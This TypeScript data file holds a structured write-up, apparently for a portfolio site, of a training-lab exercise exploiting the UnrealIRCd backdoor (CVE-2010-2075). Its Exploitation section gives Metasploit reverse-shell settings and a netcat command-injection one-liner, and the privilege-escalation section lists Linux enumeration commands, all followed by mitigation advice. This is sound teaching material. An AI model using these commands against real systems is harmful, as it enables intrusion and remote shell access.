/**
 * Hands-on security lab write-ups.
 *
 * IMPORTANT: every exercise here was performed in an authorized, isolated
 * training environment (a deliberately vulnerable VM / cyber-range style lab),
 * never against systems the author does not own or have explicit permission to
 * test. These are learning exercises, not professional penetration tests, and
 * they are written that way.
 */

export type LabCategory =
  | "Exploitation"
  | "Network Security"
  | "Linux Privilege Escalation"
  | "Web Security"
  | "Security Automation"
  | "Threat Modeling";

export type LabSection = {
  heading: string;
  body: string[];
  code?: { language: string; snippet: string; caption?: string }[];
};

export type LabWriteup = {
  slug: string;
  title: string;
  category: LabCategory;
  status: "Write-up" | "Coming soon";
  difficulty: "Beginner" | "Intermediate";
  environment: string;
  tools: string[];
  summary: string;
  /** Structured walkthrough: Scenario → Recon → Vulnerability → Exploitation → Privesc → Lessons → Mitigation */
  sections: LabSection[];
};

export const labCategories: LabCategory[] = [
  "Exploitation",
  "Network Security",
  "Linux Privilege Escalation",
  "Web Security",
  "Security Automation",
  "Threat Modeling",
];

export const labs: LabWriteup[] = [
  {
    slug: "unrealircd-backdoor",
    title: "Exploiting the UnrealIRCd Backdoor",
    category: "Exploitation",
    status: "Write-up",
    difficulty: "Beginner",
    environment:
      "Authorized, intentionally-vulnerable training VM (TryHackMe / cyber-range style). Isolated lab network — no real third-party systems involved.",
    tools: ["Kali Linux", "Nmap", "Metasploit Framework", "Netcat", "LinPEAS-style enumeration"],
    summary:
      "A classic, well-documented vulnerability used to teach the full exploit chain: recon, service " +
      "identification, exploiting a known backdoor for a reverse shell, and then escalating privileges on " +
      "Linux. A clean first example of moving from a foothold to local privilege escalation in a legal lab.",
    sections: [
      {
        heading: "Scenario",
        body: [
          "A target host in an isolated lab runs an IRC (Internet Relay Chat) service. The objective is to " +
          "demonstrate a realistic attacker workflow — discover the service, identify a known vulnerable " +
          "version, gain an initial foothold, and escalate to a higher-privilege shell — then document the " +
          "defensive lessons.",
          "This is a deliberately vulnerable training machine. Everything below was run against the lab " +
          "target only.",
        ],
      },
      {
        heading: "Reconnaissance",
        body: [
          "I started with a port scan to map the attack surface, then a service/version scan on open ports " +
          "to identify what was actually listening. IRC commonly runs on TCP port 6667 (and related ports).",
        ],
        code: [
          {
            language: "bash",
            caption: "Discover open ports and identify service versions",
            snippet:
              "# Fast scan of common ports\nnmap -T4 -p- <lab-target>\n\n# Targeted service/version detection on discovered ports\nnmap -sV -sC -p 6667,6697 <lab-target>",
          },
        ],
      },
      {
        heading: "Vulnerability",
        body: [
          "The service banner identified UnrealIRCd running a version affected by a famous backdoor. The " +
          "real-world issue is CVE-2010-2075: the UnrealIRCd 3.2.8.1 source tarball distributed for a short " +
          "window in mid-2010 contained a trojaned module that allowed a remote attacker to execute commands " +
          "by sending special characters (the characters DEBUG, in the classic write-up) before the normal " +
          "IRC commands during connection.",
          "The lab material I worked from presents this service; I treated the version string as the " +
          "indicator of the known backdoor and looked up the matching public exploit. (If you are following " +
          "along against a specific room, use the exact version string Nmap reports — some training notes " +
          "label the box slightly differently.)",
          "Root cause: malicious code introduced into the distributed software supply chain, not a memory-" +
          "corruption bug. That distinction matters for mitigation — patching/version integrity is the fix, " +
          "not input sanitization.",
        ],
      },
      {
        heading: "Exploitation",
        body: [
          "Metasploit ships a module for this exact backdoor. I configured it with the target host and the " +
          "listening IRC port, set a payload that calls back to my attacker machine, and ran it to obtain a " +
          "reverse shell.",
        ],
        code: [
          {
            language: "bash",
            caption: "Using the Metasploit module for the UnrealIRCd backdoor",
            snippet:
              "msfconsole\nmsf> use exploit/unix/irc/unreal_ircd_3281_backdoor\nmsf> set RHOSTS <lab-target>\nmsf> set RPORT 6667\nmsf> set LHOST <my-kali-ip>\nmsf> set LPORT 4444\nmsf> run\n# -> reverse shell on the target as the user running the IRC daemon",
          },
          {
            language: "bash",
            caption: "Equivalent manual check (conceptual) — the backdoor triggers on a magic token",
            snippet:
              "# The backdoor executes everything after 'DEBUG;' in the initial connection:\necho 'DEBUG; id' | nc <lab-target> 6667\n# (Shown for understanding; the Metasploit module handles the callback.)",
          },
        ],
      },
      {
        heading: "Privilege Escalation",
        body: [
          "The reverse shell arrived as the low-privileged user running the IRC service. From there I did " +
          "standard Linux local enumeration: system/kernel version, user and group memberships, SUID/SGID " +
          "binaries, writable paths, cron jobs, and running services — the kind of checklist automated by " +
          "enumeration scripts, but which I worked through manually to understand each check.",
          "Common teaching vectors in these labs include misconfigured SUID binaries, outdated kernels with " +
          "known local privilege-escalation exploits, weak file permissions on service files, or cron jobs " +
          "running as root. The point of the exercise is the enumeration methodology: gather facts, match " +
          "them against known privilege-escalation primitives, and act on the weakest link.",
        ],
        code: [
          {
            language: "bash",
            caption: "Manual local enumeration starting points",
            snippet:
              "id; whoami; sudo -l\nuname -a; cat /etc/os-release\nfind / -perm -4000 -type f 2>/dev/null   # SUID binaries\nfind / -writable -type d 2>/dev/null    # writable directories\ncat /etc/crontab; ls -la /etc/cron*     # scheduled jobs",
          },
        ],
      },
      {
        heading: "Lessons Learned",
        body: [
          "Version banners do the attacker's work for them — service/version detection turned one port into " +
          "a directly matchable, weaponized exploit.",
          "Software supply-chain compromise is devastating and simple to exploit. The backdoor was not a " +
          "subtle memory-corruption bug; it was attacker-controlled code shipped inside a trusted download.",
          "A foothold is only the beginning. Local privilege escalation is a separate discipline built on " +
          "systematic enumeration, not luck.",
          "Detection matters as much as prevention: an IRC daemon spawning a shell, or an outbound reverse " +
          "connection from a server, is exactly the kind of anomaly a SOC should catch.",
        ],
      },
      {
        heading: "Mitigation",
        body: [
          "Remove/replace the affected service and install software only from verified, official sources; " +
          "check signatures/checksums against the vendor.",
          "Do not expose services like IRC to untrusted networks; restrict management and chat services to a " +
          "VPN or allow-listed hosts.",
          "Patch and inventory software so known-vulnerable versions are flagged quickly.",
          "Run services as dedicated low-privilege users with minimal rights, so a compromise does not " +
          "immediately yield root.",
          "Monitor for process anomalies (a network service spawning shells) and unexpected outbound " +
          "connections; ship logs to a SIEM and alert on them.",
          "Practice the same chain defensively — hardening, least privilege, and detection are what turn a " +
          "successful foothold into a contained event.",
        ],
      },
    ],
  },
];

/** Category placeholders for labs to be added. */
export const upcomingLabs: { category: LabCategory; note: string }[] = [
  { category: "Web Security", note: "Planned: auth/authorization testing and input-validation exercises in intentionally vulnerable web apps." },
  { category: "Network Security", note: "Planned: packet analysis with Wireshark/tcpdump and traffic interpretation." },
  { category: "Security Automation", note: "Planned: Python scripts to automate recon, log review, and detection checks." },
  { category: "Threat Modeling", note: "Planned: STRIDE-style threat models drawn from the Chokepoint and Reset Lab projects." },
  { category: "Linux Privilege Escalation", note: "Planned: dedicated privesc enumeration and exploitation write-ups." },
];
